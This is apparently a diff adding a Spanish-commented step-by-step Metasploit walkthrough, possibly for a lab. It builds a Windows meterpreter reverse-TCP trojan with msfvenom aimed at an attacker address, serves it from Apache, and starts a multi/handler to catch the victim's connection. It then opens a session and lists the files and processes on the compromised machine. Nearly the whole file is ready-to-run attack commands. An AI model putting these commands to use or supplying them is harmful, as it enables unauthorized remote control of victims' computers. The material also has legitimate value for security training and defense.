@@ -1,0 +1,55 @@
+# Iniciar Metasploit Framework
+msfconsole
+
+# Crear el troyano con msfvenom
+# -p: Indica el payload a utilizar (reverse_tcp para conexión inversa)
+# LHOST: IP del atacante (Kali Linux)
+# LPORT: Puerto donde se recibirá la conexión
+# --format: Especifica el formato del archivo (exe para ejecutables de Windows)
+# > troyanoFULL.exe: Redirige la salida al archivo ejecutable
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.7 LPORT=4444 --format=exe > troyanoFULL.exe
+
+# Montar un servidor web para permitir la descarga del troyano
+# Se copia el archivo del troyano al directorio público de Apache
+cp troyanoFULL.exe /var/www/html
+
+# Iniciar un manejador de conexiones para el troyano
+# Este manejador espera conexiones desde la máquina víctima
+use exploit/multi/handler
+
+# Configurar los parámetros para el manejador
+# LHOST: Dirección IP del atacante
+# LPORT: Puerto configurado en el payload
+set LHOST 10.0.0.7
+set LPORT 4444
+
+# Seleccionar el payload que coincide con el troyano generado
+set payload windows/meterpreter/reverse_tcp
+
+# Verificar que todas las configuraciones del manejador sean correctas
+# Este comando muestra las opciones configuradas y permite validar errores
+show options
+
+# Iniciar el manejador para que espere conexiones desde la máquina víctima
+exploit
+
+# NOTA: En este punto, la víctima debe ejecutar el archivo "troyanoFULL.exe" en su máquina.
+# Cuando la víctima ejecuta el troyano, se establece una conexión inversa y se abre una sesión.
+
+# Comprobar las sesiones activas
+# Este comando lista todas las sesiones abiertas entre el atacante y las víctimas
+sessions
+
+# Interactuar con la sesión específica
+# Cambiar "2" por el ID de la sesión abierta que deseas controlar
+sessions -i 2
+
+# NOTA: Después de este comando, tienes acceso a la máquina víctima y puedes ejecutar comandos.
+
+# Verificar los ficheros y directorios en la máquina de la víctima
+# Este comando permite explorar los ficheros del sistema comprometido
+ls
+
+# Ver los procesos en ejecución en la máquina víctima
+# Esto proporciona una lista de procesos activos en la máquina comprometida
+ps
